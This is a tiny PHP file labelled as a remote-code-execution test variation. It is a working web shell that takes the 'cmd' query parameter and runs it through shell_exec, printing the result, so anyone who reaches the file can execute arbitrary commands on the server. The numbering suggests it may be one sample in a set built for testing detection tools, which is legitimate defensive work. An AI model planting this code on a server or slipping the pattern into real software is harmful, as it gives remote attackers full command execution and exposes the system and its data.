<?php
// RCE test variation #931
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>